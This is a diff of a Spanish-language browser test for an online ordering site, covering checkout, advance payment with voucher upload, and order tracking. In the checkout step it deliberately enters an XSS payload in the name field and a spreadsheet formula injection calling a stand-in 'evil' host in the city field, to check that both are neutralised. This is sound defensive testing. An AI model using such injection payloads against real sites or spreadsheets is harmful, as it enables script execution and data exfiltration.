@@ -25,6 +25,7 @@ const ok = (c, m) => { console.log(c ? '✓' : '✗', m); if (!c) fallas++; };
   const base = `http://localhost:${server.address().port}/`;
   const sim = cargar({ silencio: true });
   const token = sim.config('Token del sitio');
+  sim.run(`setConfig_('Datos bancarios', 'BAC · Ahorro · 7421 0098 31')`);
   const b = await chromium.launch();
   const ctx = await b.newContext({ viewport: { width: 1280, height: 900 } });
   const page = await ctx.newPage();
@@ -39,7 +40,8 @@ const ok = (c, m) => { console.log(c ? '✓' : '✗', m); if (!c) fallas++; };
       return route.fulfill({ status: 200, contentType: 'application/json', body: JSON.stringify(sim.get(q)) });
     }
     const body = JSON.parse(route.request().postData() || '{}');
-    if (body.accion === 'comprobante') sim.ctx.__ocr = `Transferencia BAC\nMonto L ${global.anticipo}.00\nRef 8812`;
+    if (body.accion === 'pedido') sim.ctx.__ocr = `Transferencia BAC\nMonto L ${Math.round(body.total * 0.5)}.00\nRef 8812`;
+    if (body.accion === 'comprobante') sim.ctx.__ocr = `Transferencia BAC\nMonto L ${global.saldo}.00\nRef 8813`;
     const out = sim.post({ ...body, token });
     await route.fulfill({ status: 200, contentType: 'application/json', body: JSON.stringify(out) });
   });
@@ -53,49 +55,57 @@ const ok = (c, m) => { console.log(c ? '✓' : '✗', m); if (!c) fallas++; };
   ok(await page.locator('header.nav .links a').count() >= 4, 'Menú común montado');
   ok(await page.locator('footer a[href="privacidad.html"]').count() > 0, 'Pie con enlace a privacidad');
 
-  // 2. pedido completo con datos maliciosos
+  // 2. pedido completo con datos maliciosos y anticipo antes de enviar
+  const jpg = path.join(__dirname, 'comprobante.jpg');
+  fs.writeFileSync(jpg, Buffer.from('/9j/4AAQSkZJRgABAQEASABIAAD/2wBDAP//////////////////////////////////////////////////////////////////////////////////////wAALCAABAAEBAREA/8QAFAABAAAAAAAAAAAAAAAAAAAACf/EABQQAQAAAAAAAAAAAAAAAAAAAAD/2gAIAQEAAD8AKp//2Q==', 'base64'));
   await page.evaluate(() => openCard(0)); await page.waitForTimeout(300);
-  await page.click('#addBtn'); await page.waitForTimeout(150);
-  await page.click('#addBtn'); await page.waitForTimeout(150);
-  await page.click('#addBtn'); await page.waitForTimeout(150);
-  await page.click('#addBtn'); await page.waitForTimeout(900);
+  for (let i = 0; i < 4; i++) { await page.click('#addBtn'); await page.waitForTimeout(150); }
+  await page.waitForTimeout(900);
   await page.click('#cartBtn'); await page.click('#goCheckout');
   await page.fill('[name=name]', '<img src=x onerror="window.__xss=1">Ana');
   await page.fill('[name=phone]', '9876 5432');
   await page.fill('[name=email]', 'ana@correo.com');
   await page.fill('[name=city]', '=IMPORTXML("http://evil";"//a")');
-  await page.click('#sendOrder'); await page.waitForTimeout(200);
-  ok(await page.isVisible('#e_consent:not(:empty)'), 'Sin aceptar el aviso no deja enviar');
+  await page.click('#goPago'); await page.waitForTimeout(200);
+  ok(await page.isVisible('#e_consent:not(:empty)'), 'Sin aceptar el aviso no deja seguir');
   await page.check('[name=consent]');
-  await page.waitForTimeout(2600); // un humano tarda: el servidor rechaza envíos instantáneos
+  await page.click('#goPago'); await page.waitForTimeout(200);
+  ok(await page.isVisible('#anticipoDrop'), 'Paso 2: pagar anticipo');
+  ok(await page.isDisabled('#sendOrder'), 'Sin comprobante no deja enviar');
+  ok((await page.textContent('.banco')).includes('BAC'), 'Muestra los datos bancarios');
+  await page.click('#backDatos'); ok((await page.inputValue('[name=phone]')) === '9876 5432', 'Regresar conserva los datos');
+  await page.click('#goPago');
+  await page.setInputFiles('#anticipoFile', jpg); await page.waitForTimeout(300);
+  await page.waitForTimeout(2300); // un humano tarda: el servidor rechaza envíos instantáneos
   await page.click('#sendOrder');
   await page.waitForSelector('#done.open', { timeout: 15000 }).catch(() => {});
   const done = await page.textContent('#doneTxt');
   const id = (done.match(/PEHN-\d{6}-\d{3}/) || [])[0];
   ok(!!id, 'Pedido enviado, número: ' + id);
+  ok(/Recibimos tu anticipo/.test(done), 'Anticipo leído al enviar');
   const fila = sim.hoja('Pedidos')[0] || {};
   ok(fila.Ciudad && fila.Ciudad.texto, 'La ciudad con fórmula quedó como texto en la hoja');
   ok(sim.hoja('Partidas').length === 1 && String(sim.hoja('Partidas')[0]['Archivo vista previa']).includes('drive'), 'Foto del diseño guardada en Drive');
-  global.anticipo = Math.round(Number(fila.Total) * 0.5);
+  ok(sim.hoja('Pagos').length === 1 && sim.hoja('Pagos')[0].Resultado === 'Coincide', 'Comprobante en Pagos: Coincide');
 
-  // 3. rastrear pedido: el número y WhatsApp se recuerdan en este dispositivo
+  // 3. Mis pedidos: el pedido aparece solo, con lo pagado
   await page.goto(base + 'pedido.html');
-  ok(await page.locator('#misPedidos [data-mio]').count() === 1, 'Lista "Tus pedidos en este dispositivo"');
-  await page.click('#misPedidos [data-mio]');
+  await page.waitForSelector('#misLista [data-mio]', { timeout: 8000 }).catch(() => {});
+  ok(await page.locator('#misLista [data-mio]').count() === 1, 'Mis pedidos lista el pedido');
+  ok(/Pagado/.test(await page.textContent('#misLista')), 'La tarjeta dice cuánto lleva pagado');
+  await page.click('#misLista [data-mio]');
   await page.waitForSelector('.ped-card', { timeout: 8000 });
-  ok((await page.textContent('.ped-card')).includes(id), 'Muestra el pedido');
+  ok((await page.textContent('.ped-card')).includes(id), 'Muestra el detalle');
   ok(!(await page.textContent('.ped-card')).includes('Ana'), 'No muestra el nombre del cliente');
 
-  // 4. comprobante
-  const jpg = path.join(__dirname, 'comprobante.jpg');
-  fs.writeFileSync(jpg, Buffer.from('/9j/4AAQSkZJRgABAQEASABIAAD/2wBDAP//////////////////////////////////////////////////////////////////////////////////////wAALCAABAAEBAREA/8QAFAABAAAAAAAAAAAAAAAAAAAACf/EABQQAQAAAAAAAAAAAAAAAAAAAAD/2gAIAQEAAD8AKp//2Q==', 'base64'));
+  // 4. comprobante del saldo desde Mis pedidos
+  global.saldo = Math.round(Number(fila.Total)) - Math.round(Number(fila.Total) * 0.5);
   await page.setInputFiles('#voucher', jpg);
   await page.waitForTimeout(400);
   await page.click('#sendVoucher');
-  await page.waitForFunction(() => /Pagado/.test(document.querySelector('.ped-montos')?.textContent || '') && !document.querySelector('#sendVoucher'), null, { timeout: 8000 }).catch(() => {});
-  const pagos = sim.hoja('Pagos');
-  ok(pagos.length === 1 && pagos[0].Resultado === 'Coincide', 'Comprobante leído: ' + (pagos[0] || {}).Resultado);
-  ok((await page.textContent('.ped-montos')).includes(String(global.anticipo).replace(/\B(?=(\d{3})+(?!\d))/g, ',')), 'Pagado se actualiza en la página');
+  await page.waitForFunction(() => !document.querySelector('#sendVoucher'), null, { timeout: 8000 }).catch(() => {});
+  ok(sim.hoja('Pagos').length === 2 && sim.hoja('Pagos')[1].Resultado === 'Coincide', 'Comprobante del saldo leído');
+  ok(/pagado por completo/.test(await page.textContent('.ped-card')), 'Pedido queda pagado por completo');
   fs.unlinkSync(jpg);
 
   // 5. teléfono equivocado
